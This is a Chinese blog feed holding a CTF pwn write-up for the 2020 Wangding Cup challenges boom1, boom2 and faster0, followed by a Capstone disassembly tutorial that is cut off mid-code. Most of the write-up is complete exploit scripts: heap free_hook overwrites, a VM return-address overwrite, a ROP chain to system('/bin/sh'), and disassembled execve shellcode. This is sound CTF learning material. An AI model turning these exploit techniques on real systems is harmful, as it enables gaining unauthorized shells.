    <id>https://nuoye-blog.github.io/2020/05/19/wp/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84pwn-wp/</id>
    <published>2020-05-19T03:55:00.000Z</published>
    <updated>2020-05-19T03:54:24.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>一个语义分析的程序，好像是c4编译器（不清楚不了解，毕竟没有上过半节计算机的课），栈、text、symbol都存放在malloc出来的几块大内存上，可以定义全局变量和局部变量，局部变量存在栈上。通过局部变量leak出栈地址，再接着leak libc基地址，最后修改free_hook为onegadget一把梭。在（PS：这里已经有libc地址并且能任意写了，所以还有一大堆的利用方式，都可以用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">p &#x3D; remote(&quot;182.92.73.10&quot;,24573)</span><br><span class="line">#gdb.attach(p,&#39;b free&#39;)</span><br><span class="line">p.sendline(&#39;&#39;&#39;</span><br><span class="line">libc;</span><br><span class="line">*ptr;</span><br><span class="line">*stack;</span><br><span class="line">chunk;</span><br><span class="line">main()&#123;</span><br><span class="line">void *add;</span><br><span class="line">add &#x3D; &amp;add;</span><br><span class="line">stack &#x3D; add + 0x18;</span><br><span class="line">stack &#x3D; *stack;</span><br><span class="line">stack &#x3D; stack -29;</span><br><span class="line">libc &#x3D; *stack -0x20830;</span><br><span class="line">ptr &#x3D; libc+0x3c67a8;</span><br><span class="line">*ptr &#x3D; libc+0x4526a;</span><br><span class="line">free(chunk);</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><p>vmpwn题，实现了几个汇编指令，不过一大堆没用的。思路：首先获得指向libc_start_main+240的指针，并且push进栈以保存，然后通过add等指令计算出onegadget地址，再通过前面保存的指针覆写返回地址，最后getshell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">'182.92.73.10'</span>, <span class="number">36642</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_base</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">13</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">26</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imm</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">n += <span class="number">1</span> &lt;&lt; <span class="number">64</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">9</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wm</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">11</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取宿主机的栈地址</span></span><br><span class="line">stack_base((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">4</span>)</span><br><span class="line">rm()</span><br><span class="line">push()</span><br><span class="line">imm(<span class="number">0xe8</span>)</span><br><span class="line">sub()<span class="comment">#reg = main_stack = stack_point - 0xe8</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#获取宿主机的libc_start_main+240地址</span></span><br><span class="line"></span><br><span class="line">rm() <span class="comment">#reg = *main_stack = libc_start_main+0x240</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#计算偏移</span></span><br><span class="line">imm(<span class="number">0xD0917</span>) <span class="comment">#reg = offset</span></span><br><span class="line">add() <span class="comment">#add reg,stack</span></span><br><span class="line"><span class="comment">#替换libc_start_main+240也就是返回地址为onegadget</span></span><br><span class="line">wm()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your code&gt;"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="faster0"><a href="#faster0" class="headerlink" title="faster0"></a>faster0</h2><p>这道题比赛的时候没有做出来。。。那个path太恶心了。然后找了pizza大佬要了脚本来看看，发现用了Capstone（嗯，不会用，所以也顺便去学了下）。大概思路就是：先获取函数地址与对应函数索引的值（比如func000就是{0:0x4008A4}）形成map；然后通过Capstone获取其中的一个跳转的table，对其中的数值解析获取到跳转函数地址（call func001这些指令）；然后再利用call指令中的相对偏移加上call下一指令的地址获取到跳转到目标函数的地址形成路线图；再通过路线图与前面形成的map就可以得出path。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">1</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span><span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br></pre></td></tr></table></figure><p>然后接下来就是一个简单的栈溢出，没啥好讲的，直接上完整的exp吧：</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>首先是前面过pow的加上获得elf的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">token = ****</span><br><span class="line">p = remote(<span class="string">"39.96.72.181"</span>,<span class="string">"42732"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">dest = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(printable, repeat=<span class="number">4</span>):</span><br><span class="line">s = <span class="string">''</span>.join(i)</span><br><span class="line">x = hashlib.sha256(s).hexdigest()</span><br><span class="line">x2 = x[:<span class="number">20</span>]</span><br><span class="line"><span class="keyword">if</span> dest == x2:</span><br><span class="line">print(<span class="string">'string : '</span> + s)</span><br><span class="line">p.sendline(s)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input your token:"</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">p.recvuntil(<span class="string">"Creating pwn file, please wait ...\n"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">s = p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = base64.b64decode(s)</span><br><span class="line">f = open(<span class="string">"pwn"</span>,<span class="string">'wb+'</span>)</span><br><span class="line">f.write(a)</span><br><span class="line">f.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后是elf的一个getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">"pwn"</span>).libc</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">100</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span><span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote(IP, PORT)</span></span><br><span class="line">p.sendline(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_ptr = <span class="number">0x400640</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000406013</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000406011</span></span><br><span class="line">write_got = <span class="number">0x609018</span></span><br><span class="line">bss = <span class="number">0x609500</span></span><br><span class="line">read_ptr = <span class="number">0x400680</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xd0</span></span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_ptr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_ptr)</span><br><span class="line">payload += p64(<span class="number">0x405f4a</span>)</span><br><span class="line">payload += p64(<span class="number">0x405F30</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"WOW,U R GREAT !\n"</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;boom1&quot;&gt;&lt;a href=&quot;#boom1&quot; class=&quot;headerlink&quot; title=&quot;boom1&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>capstone学习笔记</title>
    <link href="https://nuoye-blog.github.io/2020/05/19/RE/capstone%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://nuoye-blog.github.io/2020/05/19/RE/capstone%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-05-18T17:41:00.000Z</published>
    <updated>2020-05-18T17:46:41.287Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现网鼎的题目的时候看到大佬用了Capstone，结果看不懂。。。。就顺便学习下。。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>感觉还是看官方文档更全面一点：<a href="http://www.capstone-engine.org/lang_python.html" target="_blank" rel="noopener">http://www.capstone-engine.org/lang_python.html</a></p><p>这里就搞几个小脚本来学习下怎么用。</p><h3 id="脚本1：基础反汇编"><a href="#脚本1：基础反汇编" class="headerlink" title="脚本1：基础反汇编"></a>脚本1：基础反汇编</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)<span class="comment">#设置cpu体系为64位的x86</span></span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line">discode = cs.disasm(code, <span class="number">0x400800</span>)<span class="comment">#反汇编代码，其实地址为0x400800</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> discode:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (i.address,i.mnemonic,i.op_str)</span><br></pre></td></tr></table></figure><p>直接运行，就可以得到类似ida中看到的内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python example1.py</span><br><span class="line">0x400800:       jmp     0x40080d</span><br><span class="line">0x400802:       pop     rbx</span><br><span class="line">0x400803:       xor     eax, eax</span><br><span class="line">0x400805:       xor     ecx, ecx</span><br><span class="line">0x400807:       xor     edx, edx</span><br><span class="line">0x400809:       mov     al, 0xb</span><br><span class="line">0x40080b:       int     0x80</span><br><span class="line">0x40080d:       call    0x400802</span><br></pre></td></tr></table></figure><p>上面for循环遍历出来的i有如下几个成员：</p><table><thead><tr><th>成员名</th><th>描述</th></tr></thead><tbody><tr><td>id</td><td>汇编指令的id</td></tr><tr><td>address</td><td>代码地址</td></tr><tr><td>mnemonic</td><td>汇编指令</td></tr><tr><td>op_str</td><td>操作对象字符串</td></tr><tr><td>size</td><td>汇编指令的大小</td></tr><tr><td>bytes</td><td>返回对应汇编指令的机器码</td></tr><tr><td>operands</td><td>操作对象（后面介绍）</td></tr></tbody></table><h3 id="脚本2：operands尝试"><a href="#脚本2：operands尝试" class="headerlink" title="脚本2：operands尝试"></a>脚本2：operands尝试</h3><p>operands也包含了很多成员，下面跟着官方文档来尝试操作下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.x86 <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\x8B\x87\x76\x98\x00\x00\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> cs.disasm(code, <span class="number">0x1000</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (insn.address,insn.mnemonic,insn.op_str)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> insn.operands:</span><br><span class="line">c+=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\toperands[%d]:"</span>%c</span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_REG:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.value.reg))<span class="comment">#获取寄存器的名称</span></span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_IMM:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.value.imm)<span class="comment">#获取立即数</span></span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_MEM:<span class="comment">#如[rax+0x10]或[rax+rbx]</span></span><br><span class="line"><span class="keyword">if</span> i.mem.base != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.mem.base))<span class="comment">#获取寄存器名称，即rax</span></span><br><span class="line"><span class="keyword">if</span> i.mem.index != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.index)<span class="comment">#获取第二个寄存器名称，即rbx</span></span><br><span class="line"><span class="keyword">if</span> i.mem.disp != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.disp)<span 